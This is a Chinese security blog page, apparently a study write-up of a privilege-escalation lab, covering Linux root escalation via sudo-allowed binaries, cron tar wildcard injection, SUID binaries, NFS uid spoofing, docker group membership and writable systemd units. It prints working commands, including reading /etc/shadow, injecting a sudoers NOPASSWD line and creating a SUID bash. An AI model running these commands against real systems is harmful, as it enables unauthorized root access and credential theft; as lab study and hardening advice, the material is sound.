@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+<meta name="baidu-site-verification" content="Apimgg1hM4">
+<meta name="google-site-verification" content="ifZoQ94LmUy8sy2SVlrhnNGumEzL2SSrC4MQAq67iic">
+<meta name="msvalidate.01" content="73A8DED7002B26724C9E7637DAE89C20">
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="提权,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Boogle's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="0x00 前言本文是在阅读了in.security 提权靶场通关手册后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。 0x01 信息收集获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。  检测当前用户权限 whoami  id   查看系统的发行版本和内核版本 lsb_release -a  uname -a   查看suid文件     查看运行的服务及">
+<meta name="keywords" content="提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权姿势">
+<meta property="og:url" content="https://zhengbao.wang/Linux提权姿势/index.html">
+<meta property="og:site_name" content="Boogle&#39;s Blog">
+<meta property="og:description" content="0x00 前言本文是在阅读了in.security 提权靶场通关手册后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。 0x01 信息收集获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。  检测当前用户权限 whoami  id   查看系统的发行版本和内核版本 lsb_release -a  uname -a   查看suid文件     查看运行的服务及">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/9pc5RzrtWehmGQ2.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/5eydfPx4hBpRacN.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/ejFrkhbDVAzfXwE.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/yikXDCVNZ892mrB.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/mAOjVwKYQPMn4tl.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/lWf3ycnVjSuOkKm.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/13DjNI6qBE2PyFb.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/ZCaqENBFmHAGyzr.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/DpSmHZxsV51AUIG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/6wWuqF3zdls4ijG.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/WKQaFylPcST3oNs.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/23/IjMiak5X6hRlxJA.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/Jct4FXgTAv9bxG3.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/Siw4pRZtyB9W28c.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/XS5Z7jE6kvA4imN.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/ORBzYbu2tKAg7dn.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/orpnVlsiH2JCeuN.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/eqhYgBTGLuJZVaH.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/UNlsf8JdogWDOYh.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/7b4pQBkcJw2EWxr.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/RYWZGhbSQkTmBzL.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/VEmf9MutGBon7aL.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/sAR4UaNp6L9DbJo.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/MhyCcbHdWVPRZ5l.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/1vYNf3jI6l2cFnV.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/24/SwOntaiyFLhDGcW.png">
+<meta property="og:updated_time" content="2019-09-24T08:49:56.483Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux提权姿势">
+<meta name="twitter:description" content="0x00 前言本文是在阅读了in.security 提权靶场通关手册后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。 0x01 信息收集获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。  检测当前用户权限 whoami  id   查看系统的发行版本和内核版本 lsb_release -a  uname -a   查看suid文件     查看运行的服务及">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://zhengbao.wang/Linux提权姿势/">
+
+
+
+
+
+  <title>Linux提权姿势 | Boogle's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Boogle's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">没有网络安全，就没有国家安全</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/Linux提权姿势/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/boogle.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux提权姿势</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-24T16:48:27+08:00">
+                2019-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/后渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">后渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/Linux提权姿势/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/Linux提权姿势/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/Linux提权姿势/" class="leancloud_visitors" data-flag-title="Linux提权姿势">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文是在阅读了<code>in.security 提权靶场通关手册</code>后学习的一点总结和记录，作为笔记供以后使用查阅。原文链接将附在文末。</p>
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p>获取到一个shell后，要进行一系列的信息收集，以获取更多的提权思路。</p>
+<ul>
+<li><p>检测当前用户权限</p>
+<p><code>whoami</code>  <code>id</code></p>
+<p><img src="https://i.loli.net/2019/09/23/Ju21c6HLqaCrER7.png" alt></p>
+</li>
+<li><p>查看系统的发行版本和内核版本</p>
+<p><code>lsb_release -a</code>  <code>uname -a</code></p>
+<p><img src="https://i.loli.net/2019/09/23/9pc5RzrtWehmGQ2.png" alt></p>
+</li>
+<li><p>查看suid文件</p>
+</li>
+</ul>
+<p><img src="https://i.loli.net/2019/09/23/5eydfPx4hBpRacN.png" alt></p>
+<ul>
+<li>查看运行的服务及安装的程序</li>
+<li>查看<code>/etc/passwd</code>文件及隐藏文件等</li>
+</ul>
+<p>收集到的信息越多，越能找到更多的突破口。</p>
+<h2 id="0x02-提权方法"><a href="#0x02-提权方法" class="headerlink" title="0x02 提权方法"></a>0x02 提权方法</h2><h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo  提权"></a>sudo  提权</h3><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具。普通用户可以通过<code>sudo -l</code>命令查看可以执行哪些命令。这样普通用户就可以在不知道root密码的情况下使用这些命令。因为用户使用<code>sudo</code>命令时需验证自己身份，因此这个方法需要知道普通用户的密码。</p>
+<p><img src="https://i.loli.net/2019/09/23/ejFrkhbDVAzfXwE.png" alt></p>
+<p>可以看到靶场<code>bob</code>用户可以使用<code>awk</code> <code>curl</code> <code>man</code> 等很多命令。</p>
+<p>那么下面就这些命令展开利用，这里推荐一个在线查询工具：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+<p><code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code> 这里借助<code>awk</code>直接获取到root权限</p>
+<p><img src="https://i.loli.net/2019/09/23/yikXDCVNZ892mrB.png" alt></p>
+<p>接下来用<code>man</code>试一下</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/23/mAOjVwKYQPMn4tl.png" alt></p>
+<p>利用<code>script</code></p>
+<p><code>script -q /dev/null</code></p>
+<p><img src="https://i.loli.net/2019/09/23/lWf3ycnVjSuOkKm.png" alt></p>
+<p>利用<code>curl</code>读取root文件</p>
+<p><code>curl file:///etc/shadow</code></p>
+<p>其他的都可以通过上面的在线网站查找到利用方式，这里不一一例举了。</p>
+<h3 id="cronjobs-提权"><a href="#cronjobs-提权" class="headerlink" title="cronjobs 提权"></a>cronjobs 提权</h3><p>如果系统管理员设置了计划任务并以root权限运行，比如周期性的运行某一个脚本，如果普通有权限修改这个脚本的话，便可以执行任意命令造成权限提升。</p>
+<p>此外还有一个Crontab Tar通配符注入，当计划任务中以root权限进行tar命令操作时，可以造成通配符注入进行权限提升。下面在靶场中进行展示。</p>
+<p>查看<code>/etc/crontab</code>，可以看到每分钟执行了<code>backup</code>脚本</p>
+<p><img src="https://i.loli.net/2019/09/23/13DjNI6qBE2PyFb.png" alt></p>
+<p>查看backup内容，进行了tar打包操作，</p>
+<p><img src="https://i.loli.net/2019/09/23/ZCaqENBFmHAGyzr.png" alt></p>
+<p>然后便可以进行提权操作了</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'echo "ignite ALL=(root) NOPASSWD: ALL" &gt; /etc/sudoers'</span> &gt;test.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; <span class="string">"--checkpoint-action=exec=sh test.sh"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
+<p>等一分钟后，待计划任务完成，使用<code>sudo  bash</code>，便会提升至root权限。</p>
+<p><img src="https://i.loli.net/2019/09/23/DpSmHZxsV51AUIG.png" alt></p>
+<p>那么在第一步说到的信息收集中，查看<code>/etc/crontab</code>也应该被列为信息收集的一步，说不定就会有意想不到的收获。</p>
+<p>所以在设定计划任务时要注意一些问题：</p>
+<ul>
+<li>crontab任务千万不要写到/etc/crontab文件里。通过crontab -e去创建，让他写到默认的/var/spool/cron下；</li>
+<li>尽量避免使用root 去创建，如果一定要用root，要注意设置权限。</li>
+</ul>
+<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>suid是指二进制文件在执行时拥有其拥有者owner的权限，例如<code>passwd</code>命令</p>
+<p><img src="https://i.loli.net/2019/09/23/6wWuqF3zdls4ijG.png" alt></p>
+<p>使用<code>find / -user root -perm -4000 2&gt;/dev/null</code> 或者<code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \;</code>查找所有owner为root且为suid的二进制文件</p>
+<p><img src="https://i.loli.net/2019/09/23/WKQaFylPcST3oNs.png" alt></p>
+<p>查看其中一个<code>/usr/bin/taskset</code>,在前面提到的在线网站<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>查看命令</p>
+<p><code>sudo taskset 1 /bin/sh</code>直接获取到root权限</p>
+<p><img src="https://i.loli.net/2019/09/23/IjMiak5X6hRlxJA.png" alt></p>
+<h3 id="NFS-未授权"><a href="#NFS-未授权" class="headerlink" title="NFS 未授权"></a>NFS 未授权</h3><p>nmap扫描一下<code>nmap -T4 -sS -Pn 192.168.111.122</code></p>
+<p>发现了2049端口开启的nfs服务，nfs，英文全称Network File System，即网络文件系统，是由SUN公司研制的UNIX表示层协议，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。</p>
+<p><img src="https://i.loli.net/2019/09/24/Jct4FXgTAv9bxG3.png" alt></p>
+<p>这里使用两外一台机器对其进行访问。 </p>
+<p>首先<code>showmount -e 192.168.111.122</code>查看可以访问的目录。</p>
+<p><img src="https://i.loli.net/2019/09/24/Siw4pRZtyB9W28c.png" alt></p>
+<p>将其挂载到本地进行查看</p>
+<p><img src="https://i.loli.net/2019/09/24/XS5Z7jE6kvA4imN.png" alt></p>
+<p>我们在挂载的<code>/mnt/peter</code>目录是没有写权限的，但是由于其所有者uid设定1001，所属组gid设定1005，所有只需要本地创建一个uid为1001，gid为1005的用户即可绕过其权限验证。</p>
+<p><img src="https://i.loli.net/2019/09/24/ORBzYbu2tKAg7dn.png" alt></p>
+<p>创建一个符合要求的用户后，即可执行写操作了。</p>
+<p><img src="https://i.loli.net/2019/09/24/orpnVlsiH2JCeuN.png" alt></p>
+<p>生成新创建用户boogle的ssh公钥对和私钥对。</p>
+<p><img src="https://i.loli.net/2019/09/24/eqhYgBTGLuJZVaH.png" alt></p>
+<p>因为现在又对peter家目录的写权限，所以现在可以直接将上面的公钥对写入到peter的<code>.ssh</code>目录下，这样便可以直接使用ssh登陆获取peter用户的shell。</p>
+<p><img src="https://i.loli.net/2019/09/24/UNlsf8JdogWDOYh.png" alt></p>
+<h3 id="docker-组用户提权"><a href="#docker-组用户提权" class="headerlink" title="docker 组用户提权"></a>docker 组用户提权</h3><p>查看上面peter发现其属于<code>docker</code>组用户</p>
+<p><img src="https://i.loli.net/2019/09/24/7b4pQBkcJw2EWxr.png" alt></p>
+<p>docker组用户的权限还是非常大的，相当于root权限了。可以借助其提权到root权限。</p>
+<p>思路参考：<a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">普通用户借助Docker容器提权思路分享</a>。</p>
+<p>还有一个具体的利用代码：<a href="https://github.com/chrisfosterelli/dockerrootplease" target="_blank" rel="noopener">https://github.com/chrisfosterelli/dockerrootplease</a></p>
+<p><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></p>
+<h3 id="systemd-配置提权"><a href="#systemd-配置提权" class="headerlink" title="systemd 配置提权"></a>systemd 配置提权</h3><p>查看<code></code>文件，并且peter用户有对其读写的权限。</p>
+<p><img src="https://i.loli.net/2019/09/24/RYWZGhbSQkTmBzL.png" alt></p>
+<p>修改其配置ExecStart指向我们自定义的二进制文件，其启动时便会以root用户执行这个文件。</p>
+<p><img src="https://i.loli.net/2019/09/24/VEmf9MutGBon7aL.png" alt></p>
+<p>创建一个systemdexpl.sh脚本，将/bin/bash文件复制到systemdbash并设置一个SUID位并且赋予执行权限</p>
+<p><code>echo -e &#39;#!/bin/bash \ncp /bin/bash /home/peter/systemdbash \nchmod 6755 /home/peter/systemdbash&#39; &gt; /home/peter/systemdexpl.sh &amp;&amp; chmod +x systemdexpl.sh</code></p>
+<p><img src="https://i.loli.net/2019/09/24/sAR4UaNp6L9DbJo.png" alt></p>
+<p>重启之前便会生成systemdbash文件</p>
+<p><img src="https://i.loli.net/2019/09/24/MhyCcbHdWVPRZ5l.png" alt></p>
+<p>复制前面的ssh公钥到root用户下</p>
+<p><img src="https://i.loli.net/2019/09/24/1vYNf3jI6l2cFnV.png" alt></p>
+<p>然后便可以直接ssh登陆到root</p>
+<p><img src="https://i.loli.net/2019/09/24/SwOntaiyFLhDGcW.png" alt></p>
+<h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247489960&amp;idx=1&amp;sn=ae35c8e5eb5e08e713cfd204b71a6b9d&amp;chksm=fc1e8e7ecb6907685255c77713c7a99b4acdc223db736f1610202b84ac8467335b6b076286b9&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568377810435&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册上篇</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&amp;mid=2247490025&amp;idx=1&amp;sn=f6ba22761d89c1154c4bc9bd22e16df0&amp;chksm=fc1e8e3fcb690729907504393dd6c788c05c9cd9866e3df62786bbc318ab7524ea5c716e7501&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1568338917816&amp;sharer_shareid=1a40c63f9740ea43a4986b88206018cd#rd" target="_blank" rel="noopener">in.security 提权靶场通关手册下篇</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/Linux提权姿势/">Linux提权姿势</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 boogle 的个人博客">boogle</a></p>
+  <p><span>发布时间:</span>2019年09月24日 - 16:48</p>
+  <p><span>最后更新:</span>2019年09月24日 - 16:49</p>
+  <p><span>原始链接:</span><a href="/Linux提权姿势/" title="Linux提权姿势">https://zhengbao.wang/Linux提权姿势/</a>
+    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://zhengbao.wang/Linux提权姿势/" aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+      
+    </div>
+
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>感觉写的不错，给买个棒棒糖呗</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="boogle 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="boogle 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/提权/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ubuntu网络问题记录/" rel="next" title="ubuntu网络问题记录">
+                <i class="fa fa-chevron-left"></i> ubuntu网络问题记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/boogle.jpg" alt="boogle">
+            
+              <p class="site-author-name" itemprop="name">boogle</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aipp.me/" title="Aipp_SecurityBlog" rel="external nofollow" target="_blank">Aipp_SecurityBlog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p0desta.com/" title="p0desta" rel="external nofollow" target="_blank">p0desta</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+          
+    <div class="links-of-blogroll motion-element links-of-blogroll-block">
+      <div class="links-of-blogroll-title">
+        <!-- modify icon to fire by szw -->
+        <i class="fa fa-history fa-" aria-hidden="true"></i>
+        近期更新
+      </div>
+      <ul class="links-of-blogroll-list">
+        
+        
+          <li>
+            <a href="/Linux提权姿势/" title="Linux提权姿势" target="_blank">Linux提权姿势</a>
+          </li>
+        
+          <li>
+            <a href="/ubuntu网络问题记录/" title="ubuntu网络问题记录" target="_blank">ubuntu网络问题记录</a>
+          </li>
+        
+          <li>
+            <a href="/jsonp劫持漏洞/" title="jsonp劫持漏洞" target="_blank">jsonp劫持漏洞</a>
+          </li>
+        
+          <li>
